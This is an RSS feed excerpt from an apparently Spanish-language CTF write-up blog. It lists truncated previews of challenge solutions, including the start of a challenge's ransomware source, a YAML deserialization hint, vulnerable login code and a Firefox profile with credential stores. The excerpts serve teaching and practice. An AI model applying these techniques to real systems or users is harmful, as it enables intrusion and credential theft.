$ nc 165.232.100.46 31251 &amp;lt;------[TCS]------&amp;gt; [1] Create config [2] Load config [3] Exit &amp;gt; 1 - Creating new config - Temperature units (F/C/K): C Propulsion Components Target Temperature : 13 Solar Array Target Temperature : 37 Infrared Spectrometers Target Temperature : 0 Auto Calibration (ON/OFF) : ON Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcwJywgYXV0b19jYWxpYnJhdGlvbjogJ09OJywKICBwcm9wdWxzaW9uX3RlbXA6ICcxMycsIHNvbGFyX2FycmF5X3RlbXA6ICczNycsIHVuaXRzOiBDfQo= Uploading to ship.</description></item><item><title>Hissss</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/hissss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/hissss/</guid><description>Se nos proporciona un binario llamado auth:
$ file auth auth: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3507aa01d32c34dc8e8c6462b764adb90a82768d, stripped Descompilaciónn Si miramos las strings del binario, encontraremos muchas referencias a Python:
$ strings auth | grep python b_asyncio.cpython-38-x86_64-linux-gnu.so b_bisect.cpython-38-x86_64-linux-gnu.so b_blake2.cpython-38-x86_64-linux-gnu.so b_bz2.cpython-38-x86_64-linux-gnu.so b_codecs_cn.cpython-38-x86_64-linux-gnu.so b_codecs_hk.cpython-38-x86_64-linux-gnu.so b_codecs_iso2022.cpython-38-x86_64-linux-gnu.so b_codecs_jp.cpython-38-x86_64-linux-gnu.so b_codecs_kr.cpython-38-x86_64-linux-gnu.so b_codecs_tw.cpython-38-x86_64-linux-gnu.so b_contextvars.cpython-38-x86_64-linux-gnu.so b_csv.cpython-38-x86_64-linux-gnu.so b_ctypes.cpython-38-x86_64-linux-gnu.so b_datetime.cpython-38-x86_64-linux-gnu.so b_decimal.cpython-38-x86_64-linux-gnu.so b_hashlib.cpython-38-x86_64-linux-gnu.so b_heapq.cpython-38-x86_64-linux-gnu.so b_lzma.cpython-38-x86_64-linux-gnu.so b_md5.cpython-38-x86_64-linux-gnu.so b_multibytecodec.cpython-38-x86_64-linux-gnu.so b_multiprocessing.cpython-38-x86_64-linux-gnu.so b_opcode.cpython-38-x86_64-linux-gnu.so b_pickle.cpython-38-x86_64-linux-gnu.so b_posixshmem.</description></item><item><title>HM74</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/hm74/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/hm74/</guid><description>Se nos proporciona este código de descripción de hardware en Verilog:
module encoder( input [3:0] data_in, output [6:0] ham_out ); wire p0, p1, p2; assign p0 = data_in[3] ^ data_in[2] ^ data_in[0]; assign p1 = data_in[3] ^ data_in[1] ^ data_in[0]; assign p2 = data_in[2] ^ data_in[1] ^ data_in[0]; assign ham_out = { p0, p1, data_in[3], p2, data_in[2], data_in[1], data_in[0] }; endmodule module main; wire[3:0] data_in = 5; wire[6:0] ham_out; encoder en(data_in, ham_out); initial begin #10; $display("</description></item><item><title>Homomurphy's Law</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/homomurphys-law/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/homomurphys-law/</guid><description>Se nos da el código fuente de un proyecto de ransomware.
Análisis de código fuente Este es ransomware.py:
from Crypto import Random from encryption import * import os MBEGIN = "---BEGIN MORPHEUS KEY---" MEND = "---END MORPHEUS KEY---" GBEGIN = "----BEGIN GPUBLIC KEY---" GEND = "---END GPUBLIC KEY---" with open("note.txt", "r") as f: note = f.read() aes = AESP() gm = GM() obf = OBF() def encrypt(key): obf_key = obf.obfuscate(key) enc_key = gm.</description></item><item><title>Hope you know JS</title><link>https://7rocky.github.io/ctf/other/blackhat-ctf/hope-you-know-js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/blackhat-ctf/hope-you-know-js/</guid><description>Se nos proporciona un código JavaScript ofuscado llamado good-luck.js. Al ejecutarlo en un documento HTML sencillo, muestra una ventana para validar la flag:
&amp;lt;!doctype html&amp;gt; &amp;lt;html lang="en"&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset="UTF-8"&amp;gt; &amp;lt;title&amp;gt;Hope you know JS&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script src="good-luck.js"&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Haciendo uso del formateador Prettier en Visual Studio Code, pude encontrar patrones que se repetían a lo largo del código. Por ejemplo, empezé a sustituir expresiones como +!![] o ![] por sus valores finales.</description></item><item><title>Horror Feeds</title><link>https://7rocky.github.io/ctf/htb-challenges/web/horror-feeds/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/horror-feeds/</guid><description>Se nos proporciona esta página web:
Análisis de código estático También se nos proporciona el código fuente en Python de la aplicación web, hecha en Flask. Como estamos tratando con un formulario de inicio de sesión, vamos a echar un vistazo a cómo se interactúa con la base de datos (application/database.py):
from colorama import Cursor from application.util import generate_password_hash, verify_hash, generate_token from flask_mysqldb import MySQL mysql = MySQL() def query_db(query, args=(), one=False): with open('/tmp/log', 'a') as f: f.</description></item><item><title>Horror Feeds</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/horror-feeds/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/horror-feeds/</guid><description>Se nos proporciona esta página web:
Análisis de código estático También se nos proporciona el código fuente en Python de la aplicación web, hecha en Flask. Como estamos tratando con un formulario de inicio de sesión, vamos a echar un vistazo a cómo se interactúa con la base de datos (application/database.py):
from colorama import Cursor from application.util import generate_password_hash, verify_hash, generate_token from flask_mysqldb import MySQL mysql = MySQL() def query_db(query, args=(), one=False): with open('/tmp/log', 'a') as f: f.</description></item><item><title>How The Columns Have Turned</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/how-the-columns-have-turned/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/how-the-columns-have-turned/</guid><description>Se nos proporciona un código en Python para cifrar la flag (source.py), y también tenemos dialog.txt y encrypted_messages.txt:
import os with open('super_secret_messages.txt', 'r') as f: SUPER_SECRET_MESSAGES = [msg.strip() for msg in f.readlines()] def deriveKey(key): derived_key = [] for i, char in enumerate(key): previous_letters = key[:i] new_number = 1 for j, previous_char in enumerate(previous_letters): if previous_char &amp;gt; char: derived_key[j] += 1 else: new_number += 1 derived_key.append(new_number) return derived_key def transpose(array): return [row for row in map(list, zip(*array))] def flatten(array): return "</description></item><item><title>HTB Console</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/htb-console/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/htb-console/</guid><description>Se nos proporciona un binario de 64 bits llamado htb-console:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa Si usamos Ghidra, veremos la siguiente función main:
void main() { char command[16]; setup(); puts("Welcome HTB Console Version 0.1 Beta."); do { printf("&amp;gt;&amp;gt; "); fgets(command, 16, stdin); console(command); memset(command, 0, 16); } while(true); } El código anterior solamente pide datos al usuario y los pasa a console:</description></item><item><title>HTBank</title><link>https://7rocky.github.io/ctf/htb-challenges/web/htbank/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/htbank/</guid><description>Se nos proporciona este sitio web:
Esta vez no tenemos el código fuente, por lo que debemos hacer pruebas directamente con el sitio web.
Registro de una nueva cuenta En primer lugar, debemos registrar una cuenta:
Y luego podemos iniciar sesión para acceder a nuestro dashboard:
Análisis de archivos JavaScript Podemos retirar dinero haciendo click en el botón:
Pero no podemos añadir dinero porque el otro botón no funciona.
Mirando los archivos JavaScript (/static/js/home.</description></item><item><title>Hunting License</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/hunting-license/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/hunting-license/</guid><description>Se nos proporciona un binario llamado license:
$ file license license: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5be88c3ed329c1570ab807b55c1875d429a581a7, for GNU/Linux 3.2.0, not stripped $ ldd license linux-vdso.so.1 (0x00007ffe18bb1000) libreadline.so.8 => /lib/x86_64-linux-gnu/libreadline.so.8 (0x00007f430a30a000) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f430a118000) libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f430a0e8000) /lib64/ld-linux-x86-64.so.2 (0x00007f430a366000) Descompilación Si lo abrimos en Ghidra, veremos esta función main:
int main() { char cVar1; int iVar2; puts("So, you want to be a relic hunter?</description></item><item><title>HyperStream Test #2</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/hyperstream-test-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/hyperstream-test-2/</guid><description>Se nos proporciona este texto con solo letras A y B:
ABAAAABABAABBABBAABBAABAAAAAABAAAAAAAABAABBABABBAAAAABBABBABABBAABAABABABBAABBABBAABB El reto dice que huele a bacon. De hecho, existe el Cifrado Bacon y podemos usarlo para descifrar el texto en CyberChef:
Y la flag es: CTFlearn{ILOUEBACONDONTYOU}.</description></item><item><title>I know Mag1k</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/</guid><description>Se nos proporciona el siguiente sitio web:
En primer lugar, debemos registrar una nueva cuenta:
Ahora podemos iniciar sesión:
Y tenemos acceso a nuestro dashboard:
Podemos ver que el servidor establece dos cookies para manejar la autenticación:
Análisis del cifrado La que parece interesante es iknowmag1k, que está codificada en base64 (y codificación URL: %2B es +, %2F es / y %3D es =). Si lo decodificamos, tenemos 40 bytes que parecen aleatorios:</description></item><item><title>I'm gRoot</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/im-groot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/im-groot/</guid><description>Se nos proporciona el código fuente en Python de un servidor:
server.py: from pymerkle import InmemoryTree as MerkleTree from hashlib import sha256 from os import urandom from secret import FLAG from utils import * class Transaction: def __init__(self, _from, _to): self._from = _from self._to = _to self._signature = self.getSignature(self._from, self._to) def signature(self): return self._signature def getSignature(self, _from, _to): return sha256(_from + _to).digest() class Block: def __init__(self): self._transactions = [] def transactions(self): return self.</description></item><item><title>Iced TEA</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/iced-tea/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/iced-tea/</guid><description>Se nos proporciona el código fuente en Python que cifra la flag:
import os from secret import FLAG from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.</description></item><item><title>Illumination</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/illumination/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/illumination/</guid><description>Tenemos un proyecto de JavaScript que utiliza Git como control de versiones. En el proyecto hay un archivo bot.js y un archivo config.json. En el segundo aparece un texto codificado en Base64:
{ "token": "Replace me with token when in use! Security Risk!", "prefix": "~", "lightNum": "1337", "username": "UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ==", "host": "127.0.0.1" } $ echo UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ== | base64 -d Red Herring, read the JS carefully El token parece interesante. A lo mejor podemos encontrar la flag en confirmaciones (commits) antiguos.</description></item><item><title>IMC 1999, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-1999/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-1999/</guid><description/></item><item><title>IMC 1999, Problema 7</title><link>https://7rocky.github.io/imc/problem-7-1999/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-7-1999/</guid><description/></item><item><title>IMC 2000, Problema 3</title><link>https://7rocky.github.io/imc/problem-3-2000/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-3-2000/</guid><description/></item><item><title>IMC 2004, Problema 7</title><link>https://7rocky.github.io/imc/problem-7-2004/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-7-2004/</guid><description/></item><item><title>IMC 2004, Problema 8</title><link>https://7rocky.github.io/imc/problem-8-2004/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-8-2004/</guid><description/></item><item><title>IMC 2005, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2005/</guid><description/></item><item><title>IMC 2005, Problema 8</title><link>https://7rocky.github.io/imc/problem-8-2005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-8-2005/</guid><description/></item><item><title>IMC 2006, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2006/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2006/</guid><description/></item><item><title>IMC 2007, Problema 7</title><link>https://7rocky.github.io/imc/problem-7-2007/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-7-2007/</guid><description/></item><item><title>IMC 2010, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2010/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2010/</guid><description/></item><item><title>IMC 2012, Problema 2</title><link>https://7rocky.github.io/imc/problem-2-2012/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-2-2012/</guid><description/></item><item><title>IMC 2013, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2013/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2013/</guid><description/></item><item><title>IMC 2013, Problema 6</title><link>https://7rocky.github.io/imc/problem-6-2013/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-6-2013/</guid><description/></item><item><title>IMC 2017, Problema 6</title><link>https://7rocky.github.io/imc/problem-6-2017/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-6-2017/</guid><description/></item><item><title>IMC 2018, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2018/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2018/</guid><description/></item><item><title>IMC 2019, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2019/</guid><description/></item><item><title>IMC 2019, Problema 2</title><link>https://7rocky.github.io/imc/problem-2-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-2-2019/</guid><description/></item><item><title>IMC 2019, Problema 5</title><link>https://7rocky.github.io/imc/problem-5-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-5-2019/</guid><description/></item><item><title>IMC 2019, Problema 7</title><link>https://7rocky.github.io/imc/problem-7-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-7-2019/</guid><description/></item><item><title>IMC 2020, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2020/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2020/</guid><description/></item><item><title>IMC 2020, Problema 2</title><link>https://7rocky.github.io/imc/problem-2-2020/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-2-2020/</guid><description/></item><item><title>IMC 2021, Problema 1</title><link>https://7rocky.github.io/imc/problem-1-2021/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/imc/problem-1-2021/</guid><description/></item><item><title>Impossible Password</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/impossible-password/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/impossible-password/</guid><description>Se nos proporciona un binario llamado impossible_password.bin:
$ file impossible_password.bin impossible_password.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ba116ba1912a8c3779ddeb579404e2fdf34b1568, stripped Análisis dinámico Si lo ejecutamos, el programa espera una entrada de datos:
$ ./impossible_password.bin * asdf [asdf] Strings Si usamos strings para mostrar caracteres imprimibles en el binario veremos SuperSeKretKey:
$ strings impossible_password.bin /lib64/ld-linux-x86-64.so.2 libc.so.6 exit srand __isoc99_scanf time putchar printf malloc strcmp __libc_start_main __gmon_start__ GLIBC_2.</description></item><item><title>Infiltration</title><link>https://7rocky.github.io/ctf/htb-challenges/osint/infiltration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/osint/infiltration/</guid><description>Tenemos esta descripción del reto:
Can you find something to help you break into the company &amp;lsquo;Evil Corp LLC&amp;rsquo;. Recon social media sites to see if you can find any useful information.
LinkedIn Podemos comenzar ingresando el nombre de la empresa en un motor de búsqueda:
Lo primero que sale es LinkedIn:
Aquí tenemos una flag falsa. Podemos examinar el sitio web de la compañía, pero no hay nada interesante:</description></item><item><title>Infinite Descent</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/infinite-descent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/infinite-descent/</guid><description>Se nos proporciona un código en Python que implementa RSA de forma extraña (fastprimes.py):
#!/usr/bin/env python #********************************************************************** # filename: fasterprimes.py # version: 0.06.2-alpha # release date: 20170806 # dev: Cayce Pollard # qa: NOT PASSED, open defects. # finds a specified length prime, then a neighbouring prime for speed. # DEFECTS # ID[243], category A4, owner: CayceP, comment: may have to be run several times to generate valid RSA values # ID[552], category A9, owner: AppSec, comment: Do neighbouring primes present a security risk?</description></item><item><title>Infinite Knapsack</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/infinite-knapsack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/infinite-knapsack/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from random import randint, seed, sample, getstate import math from secret import SEED, FLAG, INIT class MH: def __init__(self, size): keys = self.generateKeys(size) self.public_key = keys[0] self.private_key = keys[1] def generateKeys(self, n): private_key = [INIT] + [0 for _ in range(n - 1)] for i in range(1, n): total = sum(private_key) private_key[i] = randint(total * 2, total * 3) total = sum(private_key) modulo = randint(total * 2, total * 3) while True: multiplier = randint(modulo // 4, modulo - 1) if math.</description></item><item><title>information</title><link>https://7rocky.github.io/ctf/picoctf/forensics/information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/forensics/information/</guid><description>Se nos proporciona una imagen JPEG llamada cat.jpg:
El archivo se reconoce como imagen JPEG:
$ file cat.jpg cat.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3 Sin embargo, si extraemos los metadatos del archivo, veremos algo curioso:
$ exiftool cat.jpg ExifTool Version Number : 12.30 File Name : cat.jpg Directory : . File Size : 858 KiB File Modification Date/Time : File Access Date/Time : File Inode Change Date/Time : File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.</description></item><item><title>Initialization</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/initialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/initialization/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
#!/usr/bin/env python3 import os from Crypto.Util import Counter from Crypto.Util.Padding import pad from Crypto.Cipher import AES class AdvancedEncryption: def __init__(self, block_size): self.KEYS = self.generate_encryption_keys() self.CTRs = [Counter.new(block_size) for i in range(len(MSG))] # nonce reuse : avoided! def generate_encryption_keys(self): keys = [[b'\x00']*16] * len(MSG) for i in range(len(keys)): for j in range(len(keys[i])): keys[i][j] = os.urandom(1) return keys def encrypt(self, i, msg): key = b''.</description></item><item><title>Insane Bolt</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/insane-bolt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/insane-bolt/</guid><description>Tenemos este juego:
$ nc 206.189.125.243 30182 1. Instructions 2. Play &amp;gt; 1 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 [*] Help the 🤖 reach the 💎. 🔩 🔩 [*] You need to find the shortest route. 🔩 🔩 [*] You need to collect 500 💎 and at least 5000 🔩.</description></item><item><title>Inside The Matrix</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/inside-the-matrix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/inside-the-matrix/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from utils import ascii_print import os from secret import FLAG from Crypto.Util.number import getPrime from matrix import Matrix from sympy import randprime assert len(FLAG) == 25 class Book: def __init__(self): self.size = 5 self.prime = None def parse(self, pt: bytes): pt = [b for b in pt] return Matrix(self.prime, self.size, self.size, pt) def generate(self): key = os.urandom(self.size**2) return self.parse(key) def rotate(self): self.</description></item><item><title>Inside The Matrix</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/inside-the-matrix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/inside-the-matrix/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from sage.all_cmdline import * # from utils import ascii_print import os FLAG = b"HTB{????????????????????}" assert len(FLAG) == 25 class Book: def __init__(self): self.size = 5 self.prime = None def parse(self, pt: bytes): pt = [b for b in pt] return matrix(GF(self.prime), self.size, self.size, pt) def generate(self): key = os.urandom(self.size**2) return self.parse(key) def rotate(self): self.prime = random_prime(2**6, False, 2**4) def encrypt(self, message: bytes): self.</description></item><item><title>Insider</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/insider/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/insider/</guid><description>Se nos proporciona una carpeta llamada Mozilla con muchos archivos de Firefox:
$ find Mozilla -type f Mozilla/Firefox/installs.ini Mozilla/Firefox/profiles.ini Mozilla/Firefox/Profiles/yodxf5e0.default/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.baklz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/failed/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/toFetch/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/compatibility.ini Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/addons.json Mozilla/Firefox/Profiles/2542z9mo.default-release/logins.json Mozilla/Firefox/Profiles/2542z9mo.default-release/search.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionCheckpoints.json Mozilla/Firefox/Profiles/2542z9mo.default-release/pkcs11.txt Mozilla/Firefox/Profiles/2542z9mo.default-release/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/extension-preferences.json Mozilla/Firefox/Profiles/2542z9mo.default-release/addonStartup.json.lz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/crashes/store.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/key4.db Mozilla/Firefox/Profiles/2542z9mo.default-release/webappsstore.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/protections.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/security_state/data.safe.bin Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/aborted-session-ping Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/session-state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604498649754.5212ab6a-268f-4c2b-aa0b-cf46c3d1dc71.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604509449817.7d32a9b1-03f4-4155-8f99-ebd1cceb30d5.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604496849746.014e92ae-cb57-4c0e-a97c-66ffa45bfe20.new-profile.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604507415845.36b506e6-3dea-4646-8ae3-62e9fd1b4692.main.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/broadcast-listeners.json Mozilla/Firefox/Profiles/2542z9mo.default-release/cookies.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/containers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/formhistory.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/extensions.json Mozilla/Firefox/Profiles/2542z9mo.default-release/handlers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/bookmarkbackups/bookmarks-2020-11-04_11_Xwf6HUY0M1+1NgBa9qQfXA==.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/content-prefs.sqlite 